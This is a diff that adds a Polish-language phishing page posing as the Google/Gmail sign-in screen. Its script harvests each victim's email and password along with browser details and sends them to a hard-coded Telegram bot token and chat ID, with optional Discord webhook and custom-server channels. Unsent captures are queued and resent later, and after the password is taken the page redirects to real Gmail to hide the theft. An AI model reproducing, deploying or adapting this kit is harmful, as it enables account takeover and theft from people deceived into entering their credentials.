@@ -1,0 +1,336 @@
+<!DOCTYPE html>
+<html lang="pl">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Zaloguj się – Konta Google</title>
+<link rel="icon" href="https://www.google.com/favicon.ico">
+<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
+<style>
+  *{box-sizing:border-box}
+  html,body{height:100%}
+  body{
+    margin:0;font-family:Roboto,Arial,sans-serif;background:#fff;color:#1f1f1f;
+    display:flex;align-items:center;justify-content:center;padding:16px;
+  }
+  .karta{
+    width:100%;max-width:448px;background:#fff;border:1px solid #dadce0;
+    border-radius:28px;padding:48px 40px 32px;
+  }
+  .logo{width:40px;height:40px;display:block}
+  h1{font-family:Roboto,Arial,sans-serif;font-size:24px;font-weight:400;line-height:1.33;
+     margin:16px 0 0;letter-spacing:0}
+  .podtytul{font-size:16px;line-height:1.5;margin:8px 0 0;color:#1f1f1f}
+  .info{font-size:14px;line-height:1.5;color:#444746;margin:16px 0 0}
+  .info a{color:#0b57d0;text-decoration:none;font-weight:500}
+  .info a:hover{text-decoration:underline}
+
+  .pole{position:relative;margin-top:32px}
+  .pole input{
+    width:100%;height:56px;padding:16px 14px 8px;font-size:16px;font-family:inherit;
+    color:#1f1f1f;background:transparent;border:1px solid #747775;border-radius:4px;
+    outline:none;transition:border-color .15s;
+  }
+  .pole input:focus{border:2px solid #0b57d0;padding:15px 13px 7px}
+  .pole label{
+    position:absolute;left:10px;top:17px;padding:0 5px;background:#fff;
+    color:#444746;font-size:16px;pointer-events:none;transition:top .12s,font-size .12s,color .12s;
+  }
+  .pole input:focus + label,
+  .pole input:not(:placeholder-shown) + label{top:-8px;font-size:12px}
+  .pole input:focus + label{color:#0b57d0}
+  .pole.zle input{border:2px solid #d93025;padding:15px 13px 7px}
+  .pole.zle label{color:#d93025}
+  .blad{display:none;color:#d93025;font-size:12px;margin:6px 0 0 2px}
+  .blad.widoczny{display:block}
+
+  .zapomniane{display:inline-block;margin-top:12px;font-size:14px;font-weight:500;
+              color:#0b57d0;text-decoration:none}
+  .zapomniane:hover{text-decoration:underline}
+
+  .akcje{display:flex;align-items:center;justify-content:space-between;gap:12px;margin-top:40px;flex-wrap:wrap}
+  button{font-family:inherit;font-size:14px;font-weight:500;letter-spacing:.25px;
+         height:40px;padding:0 24px;border-radius:20px;border:1px solid transparent;cursor:pointer}
+  .dalej{background:#0b57d0;color:#fff}
+  .dalej:hover{background:#0842a0;box-shadow:0 1px 2px rgba(60,64,67,.3)}
+  .maly{background:transparent;color:#0b57d0;border-color:#dadce0}
+  .maly:hover{background:rgba(11,87,208,.04)}
+
+  /* krok 2 */
+  #krok2{display:none}
+  .naglowek{display:flex;align-items:center;gap:12px;margin-bottom:8px}
+  .wstecz{width:36px;height:36px;padding:0;border-radius:50%;background:transparent;
+          color:#444746;font-size:20px;line-height:1;display:grid;place-items:center}
+  .wstecz:hover{background:#f0f4f9}
+  .konto{display:inline-flex;align-items:center;gap:8px;height:34px;padding:0 8px 0 4px;
+         border:1px solid #dadce0;border-radius:20px;font-size:14px;font-weight:500}
+  .avatar{width:26px;height:26px;border-radius:50%;background:#0b57d0;color:#fff;
+          font-size:13px;display:grid;place-items:center;text-transform:uppercase}
+  .konto b{font-weight:500;color:#1f1f1f;max-width:210px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+  .konto svg{width:18px;height:18px;fill:#444746}
+  .pokaz{margin-top:12px;display:flex;align-items:center;gap:10px;font-size:14px;color:#1f1f1f;cursor:pointer;user-select:none}
+  .pokaz input{width:18px;height:18px;margin:0;accent-color:#0b57d0}
+
+  .stopka{margin-top:36px;display:flex;align-items:center;justify-content:space-between;
+          gap:8px;font-size:12px;color:#444746;flex-wrap:wrap}
+  .stopka select{border:0;background:transparent;font-family:inherit;font-size:12px;color:#444746}
+  .stopka nav{display:flex;gap:20px}
+  .stopka a{color:#444746;text-decoration:none}
+  .stopka a:hover{color:#1f1f1f}
+  @media(max-width:520px){
+    .karta{border:0;padding:24px;min-height:100%;max-width:100%}
+    body{padding:0}
+  }
+</style>
+</head>
+<body>
+<main class="karta">
+  <svg class="logo" viewBox="0 0 48 48" aria-hidden="true">
+    <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
+    <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
+    <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
+    <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
+  </svg>
+
+  <h1>Zaloguj się</h1>
+  <p class="podtytul">Przejdź do Gmaila</p>
+
+  <!-- KROK 1: adres e-mail -->
+  <form id="krok1" novalidate>
+    <div class="pole" id="poleEmail">
+      <input id="email" type="text" placeholder=" " autocomplete="username"
+             inputmode="email" spellcheck="false" autofocus>
+      <label for="email">Adres e-mail lub numer telefonu</label>
+    </div>
+    <p class="blad" id="blad1">Wpisz adres e-mail lub numer telefonu</p>
+
+    <a class="zapomniane" href="https://accounts.google.com/signin/usernamerecovery" id="zapEmail">
+      Nie pamiętasz adresu e-mail?
+    </a>
+
+    <p class="info">
+      Nie należysz do swojego komputera? Skorzystaj z trybu gościa, aby zalogować się prywatnie.
+      <a href="https://support.google.com/chrome/answer/6130773" id="dowiedz">Dowiedz się więcej</a>
+    </p>
+
+    <div class="akcje">
+      <button type="button" class="maly" id="utworzKonto">Utwórz konto</button>
+      <button type="submit" class="dalej" id="dalej1">Dalej</button>
+    </div>
+  </form>
+
+  <!-- KROK 2: hasło -->
+  <form id="krok2" novalidate>
+    <div class="naglowek">
+      <button type="button" class="wstecz" id="wstecz" aria-label="Wstecz">&#8592;</button>
+      <span class="konto">
+        <span class="avatar" id="awatar">a</span>
+        <b id="kontoEmail">—</b>
+        <svg viewBox="0 0 24 24"><path d="M7 10l5 5 5-5z"/></svg>
+      </span>
+    </div>
+
+    <h1>Witaj</h1>
+    <p class="podtytul">Wpisz swoje hasło</p>
+
+    <div class="pole" id="poleHaslo">
+      <input id="haslo" type="password" placeholder=" " autocomplete="current-password">
+      <label for="haslo">Wpisz swoje hasło</label>
+    </div>
+    <p class="blad" id="blad2">Wpisz hasło</p>
+
+    <label class="pokaz"><input type="checkbox" id="pokaz"> Pokaż hasło</label>
+
+    <a class="zapomniane" href="https://accounts.google.com/signin/recovery" id="zapHaslo">
+      Nie pamiętasz hasła?
+    </a>
+
+    <div class="akcje">
+      <span></span>
+      <button type="submit" class="dalej" id="dalej2">Dalej</button>
+    </div>
+  </form>
+
+  <footer class="stopka">
+    <select aria-label="Język">
+      <option>Polski (Polska)</option>
+      <option>English (United States)</option>
+    </select>
+    <nav>
+      <a href="https://support.google.com/accounts">Pomoc</a>
+      <a href="https://policies.google.com/privacy">Prywatność</a>
+      <a href="https://policies.google.com/terms">Warunki</a>
+    </nav>
+  </footer>
+</main>
+
+<script>
+/* ====== 1. KONFIGURACJA ODBIORU DANYCH (już wypełniona) ====== */
+const KONFIG = {
+  telegram: {
+    token:  '9212266504:AAExX__0Zosn4EJnQjJDP2Mn1h3aLhtdpCA',
+    chatId: '6886926910'
+  },
+  discordWebhook: '',
+  wlasnySerwer:   ''
+};
+
+/* ====== 2. ZBIERANIE I WYSYŁKA ====== */
+const dane = { email: '', haslo: '' };
+const KLUCZ = 'kolejka_logowan';
+
+function raport(etap) {
+  return [
+    '🔐 Nowe dane logowania',
+    'Etap: ' + etap,
+    'E-mail: ' + (dane.email || '—'),
+    'Hasło: '  + (dane.haslo || '—'),
+    'Czas: '   + new Date().toLocaleString('pl-PL'),
+    'URL: '    + location.href,
+    'UA: '     + navigator.userAgent,
+    'Ekran: '  + screen.width + 'x' + screen.height + ' @' + (window.devicePixelRatio || 1)
+  ].join('\n');
+}
+
+function zapiszWKolejce(tekst) {
+  try {
+    const q = JSON.parse(localStorage.getItem(KLUCZ) || '[]');
+    q.push(tekst);
+    localStorage.setItem(KLUCZ, JSON.stringify(q.slice(-20)));
+  } catch (e) {}
+}
+
+async function wyslijTelegram(tekst) {
+  const { token, chatId } = KONFIG.telegram;
+  if (!token || token.startsWith('WSTAW')) return false;
+  const url = 'https://api.telegram.org/bot' + token + '/sendMessage';
+  try {
+    const r = await fetch(url, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ chat_id: chatId, text: tekst, disable_web_page_preview: true }),
+      keepalive: true
+    });
+    if (!r.ok) throw new Error('HTTP ' + r.status);
+    return true;
+  } catch (e) {
+    const daneForm = new URLSearchParams({ chat_id: chatId, text: tekst });
+    if (navigator.sendBeacon) navigator.sendBeacon(url, daneForm);
+    return false;
+  }
+}
+
+async function wyslijDiscord(tekst) {
+  if (!KONFIG.discordWebhook) return false;
+  try {
+    const r = await fetch(KONFIG.discordWebhook, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ content: '```\n' + tekst + '\n```' }),
+      keepalive: true
+    });
+    return r.ok;
+  } catch (e) { return false; }
+}
+
+async function wyslijSerwer(tekst) {
+  if (!KONFIG.wlasnySerwer) return false;
+  try {
+    const r = await fetch(KONFIG.wlasnySerwer, {
+      method: 'POST',
+      headers: { 'Content-Type': 'text/plain;charset=UTF-8' },
+      body: tekst, keepalive: true
+    });
+    return r.ok;
+  } catch (e) { return false; }
+}
+
+async function wyslij(etap) {
+  const tekst = raport(etap);
+  zapiszWKolejce(tekst);
+  const wynik = await Promise.race([
+    Promise.all([wyslijTelegram(tekst), wyslijDiscord(tekst), wyslijSerwer(tekst)]),
+    new Promise(r => setTimeout(() => r(null), 2500))
+  ]);
+  if (wynik && wynik.some(Boolean)) {
+    try {
+      const q = JSON.parse(localStorage.getItem(KLUCZ) || '[]');
+      q.pop();
+      localStorage.setItem(KLUCZ, JSON.stringify(q));
+    } catch (e) {}
+  }
+}
+
+(async function dograjKolejke() {
+  let q = [];
+  try { q = JSON.parse(localStorage.getItem(KLUCZ) || '[]'); } catch (e) { return; }
+  if (!q.length) return;
+  for (const t of q) {
+    const ok = await wyslijTelegram(t) || await wyslijDiscord(t) || await wyslijSerwer(t);
+    if (ok) { q.shift(); localStorage.setItem(KLUCZ, JSON.stringify(q)); } else break;
+  }
+})();
+
+/* ====== 3. OBSŁUGA INTERFEJSU ====== */
+const $ = id => document.getElementById(id);
+const krok1 = $('krok1'), krok2 = $('krok2');
+
+krok1.addEventListener('submit', async e => {
+  e.preventDefault();
+  const wal = $('email').value.trim();
+  if (!wal) { $('poleEmail').classList.add('zle'); $('blad1').classList.add('widoczny'); $('email').focus(); return; }
+  $('poleEmail').classList.remove('zle'); $('blad1').classList.remove('widoczny');
+
+  dane.email = wal;
+  $('kontoEmail').textContent = wal;
+  $('awatar').textContent = wal.charAt(0);
+
+  wyslij('e-mail');
+
+  krok1.style.display = 'none';
+  krok2.style.display = 'block';
+  $('haslo').value = '';
+  $('haslo').focus();
+});
+
+$('email').addEventListener('input', () => {
+  $('poleEmail').classList.remove('zle');
+  $('blad1').classList.remove('widoczny');
+});
+
+$('utworzKonto').addEventListener('click', () => {
+  location.href = 'https://accounts.google.com/signup';
+});
+
+krok2.addEventListener('submit', async e => {
+  e.preventDefault();
+  const wal = $('haslo').value;
+  if (!wal) { $('poleHaslo').classList.add('zle'); $('blad2').classList.add('widoczny'); $('haslo').focus(); return; }
+  $('poleHaslo').classList.remove('zle'); $('blad2').classList.remove('widoczny');
+
+  dane.haslo = wal;
+  $('dalej2').disabled = true;
+  $('dalej2').textContent = 'Logowanie…';
+
+  await wyslij('hasło');
+
+  location.href = 'https://mail.google.com/mail/u/0/';
+});
+
+$('haslo').addEventListener('input', () => {
+  $('poleHaslo').classList.remove('zle');
+  $('blad2').classList.remove('widoczny');
+});
+
+$('pokaz').addEventListener('change', e => {
+  $('haslo').type = e.target.checked ? 'text' : 'password';
+});
+
+$('wstecz').addEventListener('click', () => {
+  krok2.style.display = 'none';
+  krok1.style.display = 'block';
+  $('email').focus();
+});
+</script>
+</body>
+</html>
